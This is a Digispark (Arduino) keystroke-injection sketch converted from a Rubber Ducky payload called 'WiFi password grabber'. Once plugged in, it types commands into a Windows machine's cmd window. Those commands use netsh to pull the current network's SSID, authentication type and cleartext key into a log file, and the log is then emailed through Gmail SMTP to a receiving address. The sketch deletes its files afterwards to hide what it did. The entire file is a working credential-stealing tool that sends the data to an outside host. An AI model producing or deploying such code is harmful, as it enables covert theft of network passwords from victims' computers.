//generated by Duckyspark https://github.com/toxydose/Duckyspark

#include "DigiKeyboard.h"
#define KEY_ESC     41
#define KEY_BACKSPACE 42
#define KEY_TAB     43
#define KEY_PRT_SCR 70
#define KEY_DELETE  76

void setup() {

DigiKeyboard.delay(5000);
DigiKeyboard.sendKeyStroke(0);
// REM Title: WiFi password grabber
// REM Author: Siem
// REM Version: 4
// REM Description: Saves the SSID, Network type, Authentication and the password to Log.txt and emails the contents of Log.txt from a gmail account.
DigiKeyboard.delay(3000);
// REM --> Minimize all windows
DigiKeyboard.sendKeyStroke(KEY_D,MOD_GUI_LEFT);
// REM --> Open cmd
DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
DigiKeyboard.delay(500);
DigiKeyboard.print(F("cmd"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(200);
// REM --> Getting SSID
DigiKeyboard.print(F("cd ")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F("%USERPROFILE%")); DigiKeyboard.print(char(92)); DigiKeyboard.print(F("Desktop")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F(" & for /f ")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F("tokens=2 delims=:")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F(" %A in ('netsh wlan show interface ^| findstr ")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F("SSID")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F(" ^| findstr /v ")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F("BSSID")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F("') do set A=%A"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("set A=")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F("%A:~1%")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F(""));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
// REM --> Creating A.txt
DigiKeyboard.print(F("netsh wlan show profiles %A% key=clear | findstr /c:")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F("Network type")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F(" /c:")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F("Authentication")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F(" /c:")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F("Key Content")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F(" | findstr /v ")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F("broadcast")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F(" | findstr /v ")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F("Radio")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F(">>A.txt"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
// REM --> Get network type
DigiKeyboard.print(F("for /f ")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F("tokens=3 delims=: ")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F(" %A in ('findstr ")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F("Network type")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F(" A.txt') do set B=%A"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
// REM --> Get authentication
DigiKeyboard.print(F("for /f ")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F("tokens=2 delims=: ")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F(" %A in ('findstr ")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F("Authentication")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F(" A.txt') do set C=%A"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
// REM --> Get password
DigiKeyboard.print(F("for /f ")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F("tokens=3 delims=: ")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F(" %A in ('findstr ")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F("Key Content")); DigiKeyboard.print(char(34)); DigiKeyboard.print(F(" A.txt') do set D=%A"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
// REM --> Delete A.txt
DigiKeyboard.print(F("del A.txt"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
// REM --> Create Log.txt
DigiKeyboard.print(F("echo SSID: %A%>>Log.txt & echo Network type: %B%>>Log.txt & echo Authentication: %C%>>Log.txt & echo Password: %D%>>Log.txt"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
// REM --> Mail Log.txt
DigiKeyboard.print(F("powershell"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("$SMTPServer = 'smtp.gmail.com'"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("$SMTPInfo.EnableSsl = $true"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('ACCOUNT@gmail.com', 'PASSWORD')"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("$ReportEmail = New-Object System.Net.Mail.MailMessage"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("$ReportEmail.From = 'ACCOUNT@gmail.com'"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("$ReportEmail.To.Add('RECEIVER@gmail.com')"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("$ReportEmail.Subject = 'WiFi key grabber'"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("$ReportEmail.Body = (Get-Content Log.txt | out-string)"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("$SMTPInfo.Send($ReportEmail)"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.print(F("exit"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
// REM --> Delete Log.txt and exit
DigiKeyboard.print(F("del Log.txt & exit"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);

}


void loop() {

}

